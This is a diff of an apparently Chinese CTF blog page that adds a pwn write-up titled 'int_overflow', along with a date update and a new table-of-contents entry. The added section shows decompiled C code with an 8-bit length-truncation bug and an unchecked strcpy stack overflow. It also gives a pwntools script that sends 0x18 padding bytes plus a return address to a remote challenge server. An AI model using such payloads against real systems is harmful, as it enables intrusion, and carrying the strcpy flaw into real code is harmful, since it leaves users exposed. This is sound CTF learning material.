@@ -467,6 +467,19 @@
 
 
 
+<h3 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h3><hr>
+<blockquote>
+<p>截断：将数据放入比它小的储存空间，从而出现溢出，比如把一个int赋值给一个short，只能接受低16位</p>
+</blockquote>
+<p>关键分析代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">check_passwd</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h] 无符号八位整形 0 ~ 255</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )                    <span class="comment">// 利用截断来获得一个符合条件的v3</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid Password"</span>);</span><br><span class="line">    result = (<span class="keyword">char</span> *)fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(&amp;dest, s);                  <span class="comment">// 利用栈溢出覆盖掉返回地址</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">"220.249.52.133"</span>,<span class="string">"32339"</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"username:"</span>, <span class="string">"your dear father"</span>)</span><br><span class="line">sys_addr = <span class="number">0x0804868B</span></span><br><span class="line">payload = <span class="number">0x18</span> * <span class="string">'a'</span> + p32(sys_addr)</span><br><span class="line">io.sendlineafter(<span class="string">"passwd:"</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 
           
             <div class='article_footer'>
@@ -540,10 +553,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-08-15T11:25:05+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-08-16T19:09:54+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>最后更新于：Aug 15, 2020</p>
+    <p>最后更新于：Aug 16, 2020</p>
   </a>
 </div>
 
@@ -708,7 +721,7 @@ PS：以前听讲座的...</p>
 
 
     <div class='content'>
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#写在前面的话"><span class="toc-text">写在前面的话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是PWN"><span class="toc-text">什么是PWN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-shell"><span class="toc-text">get_shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-pwn"><span class="toc-text">hello_pwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#when-did-you-born"><span class="toc-text">when_did_you_born</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level0"><span class="toc-text">level0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2"><span class="toc-text">level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cgfsb"><span class="toc-text">Cgfsb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cgpwn2"><span class="toc-text">cgpwn2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#guess-num"><span class="toc-text">guess_num</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#写在前面的话"><span class="toc-text">写在前面的话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是PWN"><span class="toc-text">什么是PWN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-shell"><span class="toc-text">get_shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-pwn"><span class="toc-text">hello_pwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#when-did-you-born"><span class="toc-text">when_did_you_born</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level0"><span class="toc-text">level0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level2"><span class="toc-text">level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cgfsb"><span class="toc-text">Cgfsb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cgpwn2"><span class="toc-text">cgpwn2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#guess-num"><span class="toc-text">guess_num</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#int-overflow"><span class="toc-text">int_overflow</span></a></li></ol>
     </div>
   </section>
 
